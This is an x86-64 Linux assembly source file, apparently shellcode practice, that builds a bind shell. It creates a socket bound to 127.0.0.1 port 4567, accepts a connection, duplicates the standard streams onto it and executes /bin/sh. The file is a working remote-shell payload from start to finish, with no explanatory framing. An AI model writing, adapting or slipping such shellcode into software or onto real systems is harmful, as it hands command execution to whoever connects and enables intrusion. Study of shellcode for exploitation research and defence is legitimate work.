bits 64
global _start
section .text
_start: 
    mov rdi, 0x2
    mov rsi, 1
    mov rdx, 0
    mov rax, 0x29
    syscall

    mov r12, rax  
    

    mov rdi, r12
    xor rdx, rdx
    push rdx  ; 
    mov rcx, 0x0100007fd7110002
    push rcx
    ; bind
    mov rdi, r12
    mov rsi, rsp
    mov rdx, 16
    mov rax, 0x31
    syscall
    ;listen
    mov rdi, r12
    mov rsi, 0
    mov rax, 0x32
    syscall

    ; accept
    mov rdi, r12
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x2B
    syscall

    mov r15, rax  ; connected socket fd

    ; ; read from stdin then send
    ; mov rdi, 0
    ; mov rax, 0
    ; mov rsi, rsp
    ; mov rdx, 3 ; e.g. ls
    ; syscall

    ; ; send the command - - > write(socket_FD)
    ; mov rdi, r15
    ; mov rsi, rsp
    ; mov rdx, 3
    ; mov rax, 1
    ; syscall

    ; forward FDs -> socket_FD.  dup2()
    mov rdi, r15
    xor rsi, 0
    mov rax, 0x21
    syscall
    mov rdi, r15
    mov rsi, 1
    mov rax, 0x21
    syscall
    mov rdi, r15
    mov rsi, 2
    mov rax, 0x21
    syscall

    xor rdx, rdx
    push rdx

    ; execve(path, argv[], envp[])
    xor rbx, rbx
    mov rbx, "/bin/sh"
    push rbx
    mov rdi, rsp



args:

    xor rsi, rsi
    xor rdx, rdx ; envp -- null
    mov rax, 0x3b
    syscall




_exit:
mov rdi, 0

mov rax, 0x3c
syscall

    


